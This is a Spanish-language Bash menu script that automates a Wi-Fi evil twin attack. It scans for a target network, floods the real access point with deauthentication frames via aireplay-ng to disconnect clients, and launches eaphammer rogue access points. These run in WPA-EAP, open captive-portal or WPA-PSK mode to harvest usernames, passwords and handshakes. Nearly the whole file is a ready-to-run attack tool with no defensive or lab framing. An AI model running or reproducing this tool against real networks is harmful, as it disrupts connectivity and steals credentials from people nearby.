# Variables globales
stationPort=""        # Interfaz para Evil Twin
deauthPort=""         # Interfaz para Deauth
essidname=""
bssid_target=""
channel_target=""
deauth_pid=""
auth_mode="wpa-eap"   # Modo de autenticación por defecto
custom_portal=""      # Ruta del portal cautivo personalizado
psk_password=""       # Contraseña para modo PSK

# Función para verificar y generar certificados
check_certificates() {
    local cert_dir="/usr/share/eaphammer/certs"
    
    if [ ! -f "$cert_dir/server.pem" ] || [ ! -f "$cert_dir/dh" ]; then
        echo -e "\033[33m[!] Certificados no encontrados o incompletos\033[0m"
        echo -e "\033[36m[!] Generando certificados necesarios...\033[0m"
        echo ""
        
        # Generar certificados con eaphammer
        sudo eaphammer --cert-wizard
        
        # Generar archivo DH si no existe
        if [ ! -f "$cert_dir/dh" ]; then
            echo ""
            echo -e "\033[36m[!] Generando parámetros Diffie-Hellman (esto puede tardar)...\033[0m"
            sudo openssl dhparam -out $cert_dir/dh 2048
        fi
        
        echo ""
        echo -e "\033[32m[✓] Certificados generados correctamente\033[0m"
        return 0
    else
        echo -e "\033[32m[✓] Certificados encontrados\033[0m"
        return 0
    fi
}

# Función para verificar portal cautivo personalizado
check_custom_portal() {
    if [ -z "$custom_portal" ]; then
        return 1
    fi
    
    if [ ! -d "$custom_portal" ]; then
        echo -e "\033[31m[!] Error: El directorio del portal no existe\033[0m"
        return 1
    fi
    
    # Verificar que existe index.html
    if [ ! -f "$custom_portal/index.html" ]; then
        echo -e "\033[31m[!] Error: No se encuentra index.html en el portal\033[0m"
        return 1
    fi
    
    echo -e "\033[32m[✓] Portal cautivo personalizado válido\033[0m"
    return 0
}

# Función para limpiar procesos al salir
cleanup() {
    echo ""
    echo -e "\033[33m[!] Deteniendo procesos...\033[0m"
    if [ ! -z "$deauth_pid" ]; then
        kill $deauth_pid 2>/dev/null
    fi
    # Matar cualquier proceso de eaphammer
    sudo pkill -f eaphammer 2>/dev/null
    sudo pkill -f hostapd 2>/dev/null
    
    # Restaurar modo managed
    if [ ! -z "$stationPort" ]; then
        sudo airmon-ng stop ${stationPort} 2>/dev/null
        sudo ip link set $stationPort down 2>/dev/null
        sudo ip link set $stationPort up 2>/dev/null
    fi
    if [ ! -z "$deauthPort" ]; then
        sudo airmon-ng stop ${deauthPort} 2>/dev/null
    fi
    
    # Reiniciar NetworkManager si está instalado
    if command -v systemctl &> /dev/null; then
        sudo systemctl start NetworkManager 2>/dev/null
        sudo systemctl start wpa_supplicant 2>/dev/null
    fi
    clear
    echo -e "\033[32m[!] Limpieza completada\033[0m"
}

trap cleanup EXIT

until [ "$optport" = "8" ]
do
    echo -e "\e[1;31m$(cat log/log4 2>/dev/null)\e[0m"
    echo ""
    echo -e "\033[31m[-] Menu de opciones Evil Twin + Deauth: \033[0m"
    echo ""
    echo "[0] Verificar/Crear certificados"
    echo "[1] Seleccionar interfaz para Evil Twin"
    echo "[2] Seleccionar interfaz para Deauth"
    echo "[3] Escanear y seleccionar red objetivo"
    echo "[4] Configurar modo de autenticación"
    echo "[5] Configurar portal cautivo personalizado"
    echo "[6] Configurar ataque de deauthentication"
    echo "[7] Iniciar Evil Twin + Deauth"
    echo "[8] Salir"
    echo ""
    echo -e "\033[36m[*] Estado actual:\033[0m"
    echo ""
    echo "[-] Interfaz Evil Twin: ${stationPort:-No configurada}"
    echo "[-] Interfaz Deauth: ${deauthPort:-No configurada}"
    echo "[-] Red objetivo: ${essidname:-No configurada}"
    echo "[-] BSSID objetivo: ${bssid_target:-No configurado}"
    echo "[-] Canal: ${channel_target:-No configurado}"
    echo "[-] Modo autenticación: ${auth_mode}"
    if [ "$auth_mode" = "wpa-psk" ]; then
        echo "[-] Contraseña PSK: ${psk_password:+Configurada}"
    fi
    if [ ! -z "$custom_portal" ]; then
        echo "[-] Portal personalizado: $custom_portal"
    fi
    echo ""
    read -p $'\e[33m[-] Elige una opcion: \e[0m' optport
    
    case $optport in
        0)
            echo ""
            echo -e "\033[32m[!] Verificando certificados...\033[0m"
            echo ""
            check_certificates
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        1)
            echo ""
            echo -e "\033[32m[!] Interfaces de red disponibles:\033[0m"
            echo ""
            iwconfig 2>/dev/null | grep -E "^[a-z]" | cut -d' ' -f1
            echo ""
            read -p $'\e[33m[-] Interfaz para Evil Twin (ej: wlan0 - tarjeta integrada): \e[0m' stationPort
            
            # Verificar que la interfaz existe
            if ! iwconfig $stationPort &>/dev/null; then
                echo ""
                echo -e "\033[31m[!] Error: La interfaz no existe o no soporta modo monitor\033[0m"
                stationPort=""
            else
                echo ""
                echo -e "\033[32m[!] Interfaz Evil Twin guardada: $stationPort\033[0m"
            fi
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        2)
            echo ""
            echo -e "\033[32m[!] Interfaces de red disponibles:\033[0m"
            echo ""
            iwconfig 2>/dev/null | grep -E "^[a-z]" | cut -d' ' -f1
            echo ""
            read -p $'\e[33m[-] Interfaz para Deauth (ej: wlan1 - antena externa): \e[0m' deauthPort
            
            # Verificar que la interfaz existe
            if ! iwconfig $deauthPort &>/dev/null; then
                echo ""
                echo -e "\033[31m[!] Error: La interfaz no existe o no soporta modo monitor\033[0m"
                deauthPort=""
            elif [ "$deauthPort" = "$stationPort" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Debe seleccionar una interfaz diferente a la del Evil Twin\033[0m"
                deauthPort=""
            else
                echo ""
                echo -e "\033[32m[!] Interfaz Deauth guardada: $deauthPort\033[0m"
            fi
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        3)
            if [ -z "$deauthPort" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Primero debe seleccionar la interfaz de deauth (opción 2)\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                clear
                continue
            fi
            
            echo ""
            echo -e "\033[32m[!] Poniendo interfaz de deauth en modo monitor...\033[0m"
            sudo airmon-ng start $deauthPort > /dev/null 2>&1
            
            echo ""
            echo -e "\033[33m[!] Escaneando redes WiFi...\033[0m"
            echo -e "\033[36m[*] Presione Ctrl+C cuando vea su red objetivo\033[0m"
            echo ""
            
            # Escanear redes
            sudo airodump-ng ${deauthPort}
            
            echo ""
            echo -e "\033[32m[!] Escaneo completado\033[0m"
            echo ""
            read -p $'\e[33m[-] Escriba el ESSID (nombre) de la red objetivo: \e[0m' essidname
            read -p $'\e[33m[-] Escriba el BSSID (MAC) de la red objetivo: \e[0m' bssid_target
            read -p $'\e[33m[-] Escriba el CANAL de la red objetivo: \e[0m' channel_target
            
            echo ""
            echo -e "\033[32m[!] Configuración guardada:\033[0m"
            echo ""
            echo "[*] ESSID: $essidname"
            echo "[*] BSSID: $bssid_target"
            echo "[*] Canal: $channel_target"
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        4)
            echo ""
            echo -e "\033[36m[*] Seleccione el modo de autenticación:\033[0m"
            echo ""
            echo "[!] Diferentes modos capturan diferentes credenciales:"
            echo ""
            echo "[1] WPA-EAP (Usuario + Contraseña) - Solicita username y password"
            echo "[2] Open (Solo Contraseña) - Solo solicita password de WiFi"
            echo "[3] WPA-PSK (Evil Twin con contraseña) - Simula red WPA2-Personal"
            echo ""
            read -p $'\e[33m[-] Seleccione el modo [1-3]: \e[0m' auth_type
            echo ""
            case $auth_type in
                1)
                    auth_mode="wpa-eap"
                    psk_password=""
                    echo -e "\033[32m[!] Modo WPA-EAP seleccionado (captura usuario + contraseña)\033[0m"
                ;;
                2)
                    auth_mode="open"
                    psk_password=""
                    echo -e "\033[32m[!] Modo Open seleccionado (captura solo contraseña)\033[0m"
                ;;
                3)
                    auth_mode="wpa-psk"
                    echo ""
                    echo -e "\033[36m[*] Configuración de WPA-PSK:\033[0m"
                    echo -e "\033[33m[!] Esta será la contraseña del Evil Twin (NO la de la red real)\033[0m"
                    echo -e "\033[33m[!] Los clientes intentarán conectarse y capturaremos el handshake\033[0m"
                    echo ""
                    read -p $'\e[33m[-] Ingrese la contraseña para el Evil Twin (mínimo 8 caracteres): \e[0m' psk_password
                    
                    # Validar longitud de contraseña
                    while [ ${#psk_password} -lt 8 ]; do
                        echo -e "\033[31m[!] Error: La contraseña debe tener al menos 8 caracteres\033[0m"
                        read -p $'\e[33m[-] Ingrese la contraseña para el Evil Twin: \e[0m' psk_password
                    done
                    
                    echo ""
                    echo -e "\033[32m[!] Modo WPA-PSK seleccionado\033[0m"
                    echo -e "\033[32m[!] Contraseña configurada: $psk_password\033[0m"
                ;;
                *)
                    auth_mode="wpa-eap"
                    psk_password=""
                    echo -e "\033[33m[!] Modo por defecto: WPA-EAP\033[0m"
                ;;
            esac
            
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        5)
            echo ""
            echo -e "\033[36m[*] Configuración de portal cautivo personalizado:\033[0m"
            echo ""
            echo "[!] El portal cautivo se usa con modo Open o WPA-PSK"
            echo "[!] Debe ser un directorio que contenga index.html"
            echo ""
            echo "[1] Especificar ruta de portal personalizado"
            echo "[2] Usar portal por defecto de eaphammer"
            echo "[3] Borrar configuración de portal personalizado"
            echo ""
            read -p $'\e[33m[-] Seleccione una opción [1-3]: \e[0m' portal_opt
            echo ""
            
            case $portal_opt in
                1)
                    read -p $'\e[33m[-] Ingrese la ruta completa del directorio del portal: \e[0m' custom_portal
                    
                    # Validar el portal
                    if check_custom_portal; then
                        echo ""
                        echo -e "\033[32m[!] Portal cautivo configurado: $custom_portal\033[0m"
                        
                        # Listar archivos del portal
                        echo ""
                        echo -e "\033[36m[*] Archivos encontrados en el portal:\033[0m"
                        ls -lh "$custom_portal"
                    else
                        custom_portal=""
                    fi
                ;;
                2)
                    custom_portal=""
                    echo -e "\033[32m[!] Se usará el portal por defecto de eaphammer\033[0m"
                ;;
                3)
                    custom_portal=""
                    echo -e "\033[32m[!] Configuración de portal personalizado borrada\033[0m"
                ;;
                *)
                    echo -e "\033[33m[!] Opción no válida\033[0m"
                ;;
            esac
            
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        6)
            if [ -z "$bssid_target" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Primero debe escanear y configurar la red objetivo (opción 3)\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                clear
                continue
            fi
            
            echo ""
            echo -e "\033[36m[*] Configuración del ataque de deauthentication:\033[0m"
            echo ""
            echo "[!] El ataque de deauth desconectará a los clientes del AP legítimo"
            echo "para que se conecten a tu Evil Twin."
            echo ""
            echo "[1] Deauth dirigido (a todos los clientes del AP)"
            echo "[2] Deauth broadcast (más agresivo)"
            echo ""
            read -p $'\e[33m[-] Seleccione el tipo de ataque [1-2]: \e[0m' deauth_type
            echo ""
            case $deauth_type in
                1)
                    deauth_mode="directed"
                    echo -e "\033[32m[!] Modo dirigido seleccionado\033[0m"
                ;;
                2)
                    deauth_mode="broadcast"
                    echo -e "\033[32m[!] Modo broadcast seleccionado\033[0m"
                ;;
                *)
                    deauth_mode="directed"
                    echo -e "\033[33m[!] Modo por defecto: dirigido\033[0m"
                ;;
            esac
            
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        7)
            if [ -z "$stationPort" ] || [ -z "$deauthPort" ] || [ -z "$essidname" ] || [ -z "$bssid_target" ] || [ -z "$channel_target" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Faltan configuraciones. Complete las opciones necesarias primero\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                clear
                continue
            fi
            
            # Validaciones específicas por modo
            if [ "$auth_mode" = "wpa-psk" ] && [ -z "$psk_password" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Modo WPA-PSK requiere configurar una contraseña (opción 4)\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                clear
                continue
            fi
            
            # Verificar certificados antes de iniciar (solo para WPA-EAP)
            if [ "$auth_mode" = "wpa-eap" ]; then
                echo ""
                echo -e "\033[36m[!] Verificando certificados...\033[0m"
                if ! check_certificates; then
                    echo ""
                    echo -e "\033[31m[!] Error: No se pudieron generar los certificados\033[0m"
                    echo ""
                    read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                    clear
                    continue
                fi
            fi
            
            # Verificar portal personalizado si está configurado
            if [ ! -z "$custom_portal" ]; then
                if ! check_custom_portal; then
                    echo ""
                    read -p $'\e[33m[-] ¿Continuar sin portal personalizado? [s/N]: \e[0m' continue_opt
                    if [ "$continue_opt" != "s" ] && [ "$continue_opt" != "S" ]; then
                        clear
                        continue
                    fi
                    custom_portal=""
                fi
            fi
            
            echo ""
            echo -e "\033[32m[!] Iniciando ataque Evil Twin + Deauth\033[0m"
            echo ""
            echo -e "\033[33m[*] Configuración del ataque:\033[0m"
            echo ""
            echo "[-] Red objetivo: $essidname"
            echo "[-] BSSID objetivo: $bssid_target"
            echo "[-] Canal: $channel_target"
            echo "[-] Interfaz Evil Twin: $stationPort"
            echo "[-] Interfaz Deauth: ${deauthPort}"
            echo "[-] Modo autenticación: $auth_mode"
            if [ "$auth_mode" = "wpa-psk" ]; then
                echo "[-] Contraseña PSK: $psk_password"
            fi
            if [ ! -z "$custom_portal" ]; then
                echo "[-] Portal personalizado: $custom_portal"
            fi
            echo ""
            read -p $'\e[33m[-] Presione ENTER para iniciar el ataque: \e[0m' ENTER
            
            # Preparar interfaz de deauth SIN matar procesos globalmente
            echo ""
            echo -e "\033[36m[!] Configurando interfaz de deauth...\033[0m"
            
            # Solo verificar si ya está en modo monitor
            if ! iwconfig ${deauthPort} &>/dev/null; then
                sudo airmon-ng start $deauthPort > /dev/null 2>&1
            fi
            
            # Fijar el canal en la interfaz de deauth
            sudo iwconfig ${deauthPort} channel $channel_target 2>/dev/null
            
            echo -e "\033[32m[✓] Interfaz de deauth configurada\033[0m"
            
            echo ""
            echo -e "\033[36m[!] Iniciando ataque de deauthentication en segundo plano...\033[0m"
            
            # Iniciar deauth en segundo plano con la interfaz dedicada
            if [ "$deauth_mode" = "broadcast" ]; then
                # Deauth broadcast (más agresivo)
                sudo aireplay-ng --deauth 0 -a $bssid_target ${deauthPort} > /dev/null 2>&1 &
            else
                # Deauth dirigido (por defecto)
                sudo aireplay-ng --deauth 0 -a $bssid_target ${deauthPort} > /dev/null 2>&1 &
            fi
            
            deauth_pid=$!
            echo -e "\033[32m[✓] Deauth iniciado en ${deauthPort} (PID: $deauth_pid)\033[0m"
            
            sleep 3
            
            echo ""
            echo -e "\033[36m[!] Iniciando Evil Twin con eaphammer en $stationPort...\033[0m"
            echo ""
            echo -e "\033[33m[*] Presione Ctrl+C para detener el ataque\033[0m"
            echo -e "\033[33m[*] Las credenciales capturadas se guardarán en:\033[0m"
            echo -e "\033[36m    /tmp/eaphammer/\033[0m"
            echo ""
            
            # Construir comando de eaphammer según el modo seleccionado
            eap_cmd="sudo eaphammer -i $stationPort --channel $channel_target --essid \"$essidname\""
            
            case $auth_mode in
                "wpa-eap")
                    # Modo WPA-EAP (usuario + contraseña)
                    eap_cmd="$eap_cmd --auth wpa-eap --creds"
                ;;
                
                "open")
                    # Modo Open con portal cautivo
                    eap_cmd="$eap_cmd --auth open --captive-portal"
                    
                    # Agregar portal personalizado si está configurado
                    if [ ! -z "$custom_portal" ]; then
                        eap_cmd="$eap_cmd --portal-template \"$custom_portal\""
                    fi
                ;;
                
                "wpa-psk")
                    # Modo WPA-PSK
                    eap_cmd="$eap_cmd --auth wpa-psk --wpa-passphrase \"$psk_password\" --captive-portal"
                    
                    # Agregar portal personalizado si está configurado
                    if [ ! -z "$custom_portal" ]; then
                        eap_cmd="$eap_cmd --portal-template \"$custom_portal\""
                    fi
                    
                    echo -e "\033[36m[*] Modo WPA-PSK: Los clientes necesitarán la contraseña '$psk_password' para conectarse\033[0m"
                    echo -e "\033[36m[*] Capturando handshakes y credenciales del portal...\033[0m"
                    echo ""
                ;;
            esac
            
            # Ejecutar el comando
            eval $eap_cmd
            
            # Cuando termine eaphammer, matar el proceso de deauth
            if [ ! -z "$deauth_pid" ]; then
                kill $deauth_pid 2>/dev/null
                deauth_pid=""
            fi
            
            echo ""
            echo -e "\033[32m[!] Ataque finalizado\033[0m"
            echo ""
            echo -e "\033[36m[*] Revise las credenciales capturadas en: /tmp/eaphammer/\033[0m"
            
            # Información específica según el modo
            if [ "$auth_mode" = "wpa-psk" ]; then
                echo -e "\033[36m[*] Busque archivos .cap con handshakes capturados\033[0m"
            fi
            
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        

        
        8)
            clear
            echo -e "\033[32m[!] Saliendo...\033[0m"
            echo ""
        ;;
        
        *)
            clear
            echo -e "\033[31m[!] Opcion invalida, repita de nuevo.\033[0m"
            echo ""
        ;;
    esac
done